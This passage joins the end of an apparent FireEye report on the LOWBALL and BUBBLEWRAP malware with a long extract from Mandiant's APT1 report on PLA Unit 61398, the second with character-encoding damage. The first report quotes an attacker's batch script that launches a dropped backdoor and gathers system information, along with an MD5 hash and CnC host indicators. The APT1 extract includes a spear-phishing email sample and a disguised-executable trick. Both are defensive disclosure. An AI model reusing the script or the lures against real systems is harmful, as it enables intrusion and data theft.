computer to download additional malware.\\nWe observed the threat group upload a second stage malware, known as BUBBLEWRAP (also known as Backdoor.APT.FakeWinHTTPHelper) to their Dropbox account along with the following command:\\n@echo off\\nren \"%temp%\\\\upload\" audiodg.exe\\nstart %temp%\\\\audiodg.exe\\ndir d:\\\\ >> %temp%\\\\download\\nsysteminfo >> %temp%\\\\download\\ndel %0\\nWe have previously observed the email\\xa0protected group use BUBBLEWRAP. This particular sample connected to the CnC domain accounts.serveftp.com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity:\\nMD5\\n0beb957923df2c885d29a9c1743dd94b\\naccounts.serveftp.com\\n59.188.0.197\\nBUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy. This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities.\\nA Second Operation\\nFireEye works closely with security researchers and industry partners to mitigate cyber threats, and we collaborated with Dropbox to respond to this activity. The Dropbox security team was able to identify this abuse and put countermeasures in place.\\nOur cooperation uncovered what appears to be a second, ongoing operation, though we lack sufficient evidence to verify if email\\xa0protected is behind it. The attack lifecycle followed the same pattern, though some of the filenames were different, which indicates that there may be multiple versions of the malware. In addition, while the operation targeting Hong Kong-based media involved a smaller number of targets and a limited duration, we suspect this second operation involves up to 50 targets. At this time, we are unable to identify the victims.\\nIn this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account. The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):\\nupload.bat, a batch script that the compromised machine will execute\\nupload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe) \\xa0which the batch script will run and almost always uploads the results of download.rar to the cloud storage account\\nsilent.txt and period.txt, \\xa0small files sizes of 0-4 bytes that dictate the frequency to check in with the CnC\\nThe threat actor will then download the results and then delete the files from the cloud storage account.\\nConclusion\\nLOWBALL is an example of malware that abuses cloud storage services to mask its activity from network defenders. The LOWBALL first stage malware allows the group to collect information from victims and then deliver the BUBBLEWRAP second stage malware to their victims after verifying that they are indeed interesting targets.\\nA version of this article appeared first on the FireEye Intelligence Center.

Mandiant APT1 2 www.mandiant.com EXECUTIVE SUMMARY Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. The majority of these security breaches are attributed to advanced threat actors referred to as the ﬁAdvanced Persistent Threatﬂ (APT). We ˜rst published details about the APT in our January 2010 M-Trends report. As we stated in the report, our position was that ﬁThe Chinese government may authorize this activity, but there™s no way to determine the extent of its involvement.ﬂ Now, three years later, we have the evidence required to change our assessment. The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them.3 Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most proli˜c of these groups. We refer to this group as ﬁAPT1ﬂ and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most proli˜c cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1™s operations compelled us to write this report.The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted. Though our visibility of APT1™s activities is incomplete, we have analyzed the group™s intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1™s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others.Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China™s cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign in large part because it receives direct government support. In seeking to identify the organization behind this activity, our research found that People™s Liberation Army (PLA™s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.3 Our conclusions are based exclusively on unclassi˜ed, open source information derived from Mandiant observations. None of the information in this report involves access to or con˜rmation by classi˜ed intelligence. Mandiant APT1 3 www.mandiant.com KEY FINDINGSAPT1 is believed to be the 2nd Bureau of the People™s Liberation Army (PL A) General Staff Department™s (GSD) 3rd Department (), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398).»The nature of ﬁUnit 61398™sﬂ work is considered by China to be a state secret; however, we believe it engages in harmful ﬁComputer Network Operations.ﬂ »Unit 61398 is partially situated on Datong Road () in Gaoqiaozhen (), which is located in the Pudong New Area () of Shanghai (). The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007.»We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 61398™s physical infrastructure. »China Telecom provided special ˜ber optic communications infrastructure for the unit in the name of national defense.»Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be pro˜cient in the English language. »Mandiant has traced APT1™s activity to four large networks in Shanghai, two of which serve the Pudong New Area where Unit 61398 is based.APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously. 4»Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.»APT1 has a well-de˜ned attack methodology, honed over years and designed to steal large volumes of valuable intellectual property. »Once APT1 has established access, they periodically revisit the victim™s network over several months or years and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists from victim organizations™ leadership. »APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email Š GETMAIL and MAPIGET. »APT1 maintained access to victim networks for an average of 356 days.5 The longest time period APT1 maintained access to a victim™s network was 1,764 days, or four years and ten months. »Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten-month time period. »In the ˜rst month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different industries.4 We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report.5 This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 4 www.mandiant.com APT1 focuses on compromising organizations across a broad range of industries in English-speaking countries. »Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language. »The industries APT1 targets match industries that China has identi˜ed as strategic to their growth, including four of the seven strategic emerging industries that China identi˜ed in its 12th Five Year Plan. APT1 maintains an extensive infrastructure of computer systems around the world.»APT1 controls thousands of systems in support of their computer intrusion activities. »In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were registered to organizations in China (709), followed by the U.S. (109). »In the last three years we have observed APT1 use fully quali˜ed domain names (FQDNs) resolving to 988 unique IP addresses.»Over a two-year period (January 2011 to January 2013) we con˜rmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user with an interactive graphical interface to a system.»In the last several years we have con˜rmed 2,551 FQDNs attributed to APT1. In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simpli˜ed Chinese language.»In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 operator™s keyboard layout setting was ﬁChinese (Simpli˜ed) Š US Keyboardﬂ. Microsoft™s Remote Desktop client con˜gures this setting automatically based on the selected language on the client system. Therefore, the APT1 attackers likely have their Microsoft® operating system con˜gured to display Simpli˜ed Chinese fonts.»817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China.»We observed 767 separate instances in which APT1 intruders used the ﬁHUC Packet Transmit Toolﬂ or HTRAN to communicate between 614 distinct routable IP addresses and their victims™ systems using their attack infrastructure. Of the 614 distinct IP addresses used for HTRAN communications: ˚614 of 614 (100%) were registered in China.˚613 (99.8%) were registered to one of four Shanghai net blocks. Mandiant APT1 5 www.mandiant.com The size of APT1™s infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators. »We conservatively estimate that APT1™s current attack infrastructure includes over 1,000 servers. »Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly supported by linguists, open source researchers, malware authors, industry experts who translate task requests from requestors to the operators, and people who then transmit stolen information to the requestors. »APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who handle ˜nances, facility management, and logistics (e.g., shipping).In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with APT1 activity. »The ˜rst persona, ﬁUglyGorillaﬂ, has been active in computer network operations since October 2004. His activities include registering domains attributed to APT1 and authoring malware used in APT1 campaigns. ﬁUglyGorillaﬂ publicly expressed his interest in China™s ﬁcyber troopsﬂ in January 2004. »The second persona, an actor we call ﬁDOTAﬂ, has registered dozens of email accounts used to conduct social engineering and spear phishing attacks in support of APT1 campaigns. ﬁDOTAﬂ used a Shanghai phone number while registering these accounts.»We have observed both the ﬁUglyGorillaﬂ persona and the ﬁDOTAﬂ persona using the same shared infrastructure, including FQDNs and IP ranges that we have attributed to APT1. »The third persona, who uses the nickname ﬁSuperHard,ﬂ is the creator or a signi˜cant contributor to the AURIGA and BANGAT malware families which we have observed APT1 and other APT groups use. ﬁSuperHardﬂ discloses his location to be the Pudong New Area of Shanghai.Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations. »Speci˜cally, Mandiant is providing the following: ˚Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of malware.˚Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1™s arsenal of digital weapons. ˚Thirteen (13) X.509 encryption certi˜cates used by APT1.˚A compilation of videos showing actual attacker sessions and their intrusion activities.»While existing customers of Mandiant™s enterprise-level products , Mandiant Managed Defense and Mandiant Intelligent Response®, have had prior access to these APT1 Indicators, we are also making them available for use with RedlineŽ, our free host-based investigative tool. Redline can be downloaded at http://www.mandiant.com/ resources/download/redline. Mandiant APT1 6 www.mandiant.com ConclusionThe sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identi˜ed group based in China leaves little doubt about the organization behind APT1. We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely possibility:A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398™s gates, performing tasks similar to Unit 61398™s known mission. Why We Are Exposing APT1 The decision to publish a signi˜cant part of our intelligence about Unit 61398 was a painstaking one. What started as a ﬁwhat ifﬂ discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches.At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, publishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398™s operations and impede their progress in a meaningful way. We are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of criticism. Mandiant APT1 7 www.mandiant.com CHINA™S CO MPUTER NETWORK OPERAT IONS TASKING TO PLA UNIT 61398 (61398)Our research and observations indicate that the Communist Party of China (CPC,) is tasking the Chinese People™s Liberation Army (PLA,) to commit systematic cyber espionage and data theft against organizations around the world. This section provides photos and details of Unit 61398 facilities, Chinese references discussing the unit™s training and coursework requirements, and internal Chinese communications documenting the nature of the unit™s relationship with at least one state-owned enterprise. These details will be particularly relevant when we discuss APT1™s expertise, personnel, location, and infrastructure, which parallel those of Unit 61398.The Communist Party of ChinaThe PLA™s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China™s state- owned enterprises to support its operations. The CPC is the ultimate authority in Mainland China; unlike in Western societies, in which political parties are subordinate to the government, the military and government in China are subordinate to the CPC. In fact, the PLA reports directly to the CPC™s Central Military Commission (CMC, ).6 This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC.We believe that the PLA™s strategic cyber command is situated in the PLA™s General Staff Department (GSD, ), speci˜cally its 3rd Department ().7 The GSD is the most senior PLA department. Similar to the U.S. Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA. Within the GSD, the 3rd Department has a combined focus on signals intelligence, foreign language pro˜ciency, and defense information 6 James C. Mulvenon and Andrew N. D.

Mandiant APT1 9 www.mandiant.com Inferring the Computer Network Operations Mission and Capabilities of Unit 61398 (61398) Publicly available references con˜rm that the PLA GSD™s 3rd Department, 2nd Bureau, is Military Unit Cover Designator (MUCD) 61398, more commonly known as Unit 61398.12 They also clearly indicate that Unit 61398 is tasked with computer network operations (CNO).13 The Project 2049 Institute reported in 2011 that Unit 61398 ﬁappears to function as the Third Department`s premier entity targeting the United States and Canada, most likely focusing on political, economic, and military-related intelligence.ﬂ14 Our research supports this and also suggests Unit 61398™s CNO activities are not limited to the U.S. and Canada, but likely extend to any organization where English is the primary language. Identifying GSD 3rd Department, 2nd Bureau as Unit 61398The care with which the PLA maintains the separation between the GSD 3rd Department, 2nd Bureau, and the MUCD 61398 can be partially observed by searching the Internet for of˜cial documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398. Figure 2 shows the results of one of these queries.FIGURE 2: No results found for searching for ﬁGSD 3rd Department 2nd Bureauﬂ and ﬁUnit 61398ﬂ on any Chinese government websitesDespite our challenges ˜nding a link between the Chinese Government and Unit 61398 online, our searches did ˜nd references online indicating that the GSD 3rd Department, 2nd Bureau, is actually Unit 61398.

For example, public sources con˜rm that in early 2007, Jiangsu Longhai Construction Engineering Group () completed work on a new building for Unit 61398 located at Datong Road 208 within the Pudong New Area of Shanghai (208),21 which is referred to as the ﬁUnit 61398 Center Buildingﬂ (61398). At 12 stories in height, and offering 130,663 square feet of space, we estimate that this building houses of˜ces for approximately 2,000 people.

This bureau already placed ˜ber-optic cable at the East Gate front entrance road pole. They need to use two ports to enter our company™s East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company™s Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military ˜ber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division™s negotiation with the 3rd Department 2nd Bureau™s communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas™ channels, our company has a relatively abundant inventory to satisfy the military™s request. This is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military™s suggested price. Because this is a one-time payment, and it is dif˜cult to use the normal renting method, we suggest our company accept one-time payment using the reason of ﬁMilitary Co-Construction with China Telecom of Communication Channelsﬂ and provide from our inventory. The military™s co-building does not interfere with our proprietary rights. If something breaks, the military is responsible to repair it and pay for the expenses. After you agree with our suggestion, we will sign an agreement with the communication branch of 61398 and implement it.Please provide a statement about whether the above suggestion is appropriate or not.

FIGURE 9: English Translation of China Telecom Memo Mandiant APT1 19 www.mandiant.com Synopsis of PLA Unit 61398˚The evidence we have collected on PLA Unit 61398™s mission and infrastructure reveals an organization that: »Employs hundreds, perhaps thousands of personnel»Requires personnel trained in computer security and computer network operations»Requires personnel pro˜cient in the English language»Has large-scale infrastructure and facilities in the ﬁPudong New Areaﬂ of Shanghai»Was the bene˜ciary of special ˜ber optic communication infrastructure provided by state-owned enterprise China Telecom in the name of national defense The following sections of this report detail APT1™s cyber espionage and data theft operations. The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign. We will demonstrate that the nature of APT1™s targeted victims and the group™s infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398. Mandiant APT1 20 www.mandiant.com APT1: YEARS OF ESPIONAGE Our evidence indicates that APT1 has been stealing hundreds of terabytes of data from at least 141 organizations across a diverse set of industries beginning as early as 2006. Remarkably, we have witnessed APT1 target dozens of organizations simultaneously. Once the group establishes access to a victim™s network, they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, emails and contact lists from victim organizations™ leadership. We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has committed.APT1 Puts the ﬁPersistentﬂ in APTSince 2006 we have seen APT1 relentlessly expand its access to new victims. Figure 10 shows the timeline of the 141 compromises we are aware of; each marker in the ˜gure represents a separate victim and indicates the earliest con˜rmed date of APT1 activity in that organization™s network. 26With the ephemeral nature of electronic evidence, many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1™s presence in the network.FIGURE 10: Timeline showing dates of earliest known APT1 activity in the networks of the 141 organizations in which Mandiant has observed APT1 conducting cyber espionage.26 Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each year, which may re˛ect an increase in APT1™s activity. However, this increase may also simply re˛ect Mandiant™s expanding visibility into APT1™s activities as the company has grown and victims™ awareness of cyber espionage activity in their networks has improved.2006200720082009 2010201120122013Organizations compromised by APT1 over time Mandiant APT1 21 www.mandiant.com Longest time period withinwhich APT1 has continued to access a victim™s network:4 Years, 10 MonthsOnce APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in Figure 10, we found that APT1 maintained access to the victim™s network for an average of 356 days. 27 The longest time period APT1 maintained access to a victim™s network was at least 1,764 days, or four years and ten months. APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network.APT1™s Geographic & Industry Focus The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple of˜cial languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English- language pro˜ciency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities. 27 This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network.

In the case of victims with a multinational presence, the location shown re˚ects either the branch of the organization that APT1 compromised (when known), or else is the location of the organization™s headquarters. APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identi˜ed, organized by the 20 major industries they represent. The results suggest that APT1™s mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the ˜gure represent only the fraction of APT1 victims that we con˜rmed directly, the range of industries that APT1 targets may be even broader than our ˜ndings suggest.Further, the scope of APT1™s parallel activities implies that the group has signi˜cant personnel and technical resources at its disposal. In the ˜rst month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim™s network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims.

We determined each organization™s industry based on reviewing its industry classi˜cation in the Hoover™s 29 system. We also considered the content of the data that APT1 stole in each case, to the extent that this information was available.28 Joseph Casey and Katherine Koleski, Backgrounder: China™s 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011), 19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013. 29 http://www.hoovers.com/ Mandiant APT1 25 www.mandiant.com APT1 Data TheftAPT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:»product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies;»manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes;»business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions;»policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high- ranking personnel; »emails of high-ranking employees; and»user credentials and network architecture information.It is often dif˜cult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:»APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities.»Pre-existing network security monitoring rarely records or identi˜es the data theft.»The duration of time between the data theft and Mandiant™s investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business. »Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach.Even with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1™s operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.Largest APT1 data theft from a single organization:6.5 Terabytesover 10 monthsAlthough we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed ˜le archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of ˜les from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group™s efforts were not ˜nding their way into the hands of entities able to capitalize on them. Mandiant APT1 26 www.mandiant.com APT1 In The NewsPublic reporting corroborates and extends our observations of APT1™s cyber espionage activity. However, several factors complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them.To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we have con˜rmed as referring to APT1.»The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of Symantec.30 The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as Ugly Gorilla (discussed later in this report).»In September 2012, Brian Krebs of the ﬁKrebs on Securityﬂ cybercrime blog reported on a security breach at Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure that the hackers used to exploit and gain access to the system.31TABLE 3: Identifying APT1 Nicknames in the NewsNicknameVerdict Comment CrewCon˜rmed APT1Comment GroupCon˜rmed APT1Shady RatPossibly APT1 (not con˜rmed)Nitro AttacksNot APT1; Attributed to another tracked APT groupElderwoodNot APT1; Attributed to another tracked APT groupSykipotNot APT1; Attributed to another tracked APT groupAuroraNot APT1; Attributed to another tracked APT groupNight DragonNot APT1; Attributed to another tracked APT group»A SCADA security company by the name of Digital Bond published a report of spear phishing against its company in June 2012.32 AlienVault provided analysis on the associated malware. 33 Indicators included in the report have been attributed as part of APT1 infrastructure.»In November 2012, Bloomberg™s Chloe Whiteaker authored a piece on a Chinese threat group called ﬁComment Group,ﬂ which described the various tools and domains used by APT1 persona Ugly Gorilla.3430 Symantec, ﬁBackdoor.Wualess,ﬂ Symantec Security Response (2007), http://www.symantec.com/ja/jp/security_response/print_writeup. jsp?docid=2006-101116-1723-99, accessed February 3, 2013.31 Brian Krebs, ﬁChinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,ﬂ Krebs on Security (2012) http://krebsonsecurity. com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed February 3, 2013 32 Reid Wightman, ﬁSpear Phishing Attempt,ﬂ Digital Bond (2012), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed February 3, 2013.33 Jaime Blasco, ﬁUnveiling a spearphishing campaign and possible rami˜cations,ﬂ Alien Vault (2012), http://labs.alienvault.com/labs/index.php/2012/unveiling-a-spearphishing-campaign-and-possible-rami˜cations/, accessed February 3, 2013.34 Chloe Whiteaker, ﬁFollowing the Hackers™ Trail,ﬂ Bloomberg, (2012) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed February 3, 2013. Mandiant APT1 27 www.mandiant.com APT1: ATTA CK LIFECYCLEAPT1 has a well-de˜ned attack methodology, honed over years and designed to steal massive quantities of intellectual property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting compressed bundles of ˜les to China Œ before beginning the cycle again. They employ good English Š with acceptable slang Š in their socially engineered emails. They have evolved their digital weapons for more than seven years, resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships. These attacks ˜t into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant™s Attack Lifecycle model. In each stage we will discuss APT1™s speci˜c techniques to illustrate their tenacity and the scale at which they operate. (See Appendix B: ﬁAPT and the Attack Lifecycleﬂ for a high-level overview of the steps most APT groups take in each stage of the Attack Lifecycle.)InitialReconInitialCompromiseEstablishFootholdEscalatePrivilegesCompleteMissionInternalReconMoveLaterallyMaintainPresenceFIGURE 14: Mandiant™s Attack Lifecycle Model Mandiant APT1 28 www.mandiant.com The Initial CompromiseThe Initial Compromise represents the methods intruders use to ˜rst penetrate a target organization™s network. As with most other APT groups, spear phishing is APT1™s most commonly used technique. The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious ˜le. The subject line and the text in the email body are usually relevant to the recipient. APT1 also creates webmail accounts using real peoples™ names Š names that are familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel Š and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant employees:Date: Wed, 18 Apr 2012 06:31:41 -0700 From: Kevin Mandia <kevin.mandia@rocketmail.com> Subject: Internal Discussion on the Press ReleaseHello,Shall we schedule a time to meet next week? Details click here.Kevin MandiaFIGURE 15: APT1 Spear Phishing Email At ˜rst glance, the email appeared to be from Mandiant™s CEO, Kevin Mandia. However, further scrutiny shows that the email was not sent from a Mandiant email account, but from ﬁkevin.mandia@rocketmail.comﬂ. Rocketmail is a free webmail service. The account ﬁkevin.mandia@rocketmail.comﬂ does not belong to Mr. Mandia. Rather, an APT1 actor likely signed up for the account speci˜cally for this spear phishing event. If anyone had clicked on the link that day (which no one did, thankfully), their computer would have downloaded a malicious ZIP ˜le named ﬁInternal_ Discussion_Press_Release_In_Next_Week8.zipﬂ. This ˜le contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE. Mandiant APT1 29 www.mandiant.com Although the ˜les that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the predominant trend we have observed in the last several years. Below is a sampling of ˜le names that APT1 has used with their malicious ZIP ˜les: Spear Phishing Emailwith Attachment@What™s this email?Is this for real?@@!ﬁIt™s legit.ﬂOkay, thanks!APT 1APT 1APT 1The example ˜le names include military, economic, and diplomatic themes, suggesting the wide range of industries that APT1 targets. Some names are also generic (e.g., ﬁupdated_of˜ce_contact_v1.zipﬂ) and could be used for targets in any industry. On some occasions, unsuspecting email recipients have replied to the spear phishing messages, believing they were communicating with their acquaintances. In one case a person replied, ﬁI™m not sure if this is legit, so I didn™t open it.ﬂ Within 20 minutes, someone in APT1 responded with a terse email back: ﬁIt™s legit.ﬂ FIGURE 16: APT1™s interaction with a spear phishing recipient Mandiant APT1 30 www.mandiant.com Would you click on this?Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP ˜les look like benign Adobe PDF ˜les. Here is an example:This is not a PDF ˜le. It looks like the ˜lename has a PDF extension but the ˜le name actually includes 119 spaces after ﬁ.pdfﬂ followed by ﬁ.exeﬂ Š the real ˜le extension. APT1 even went to the trouble of turning the executable™s icon to an Adobe symbol to complete the ruse. However, this ˜le is actually a dropper for a custom APT1 backdoor that we call WEBC2-QBP. Establishing A FootholdEstablishing a foothold involves actions that ensure control of the target network™s systems from outside the network. APT1 establishes a foothold once email recipients open a malicious ˜le and a backdoor is subsequently installed. A backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT backdoors initiate outbound connections to the intruder™s ﬁcommand and controlﬂ (C2) server. APT intruders employ this tactic because while network ˜rewalls are generally adept at keeping malware outside the network from initiating communication with systems inside the network, they are less reliable at keeping malware that is already inside the network from communicating to systems outside. 1001100100011010100 10010100101110001100100011010100 C2FIGURE 17: Backdoors installed on compromised systems usually initiate connections with C2 serversWhile APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of backdoors in ﬁAppendix C: The Malware Arsenalﬂ that APT1 uses that we believe are not publicly available. In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1™s backdoors in two categories: ﬁBeachhead Backdoorsﬂ and ﬁStandard Backdoors.ﬂ Mandiant APT1 31 www.mandiant.com Beachhead BackdoorsBeachhead backdoors are typically minimally featured. They offer the attacker a toe-hold to perform simple tasks like retrieve ˜les, gather basic system information and trigger the execution of other more signi˜cant capabilities such as a standard backdoor. APT1™s beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the 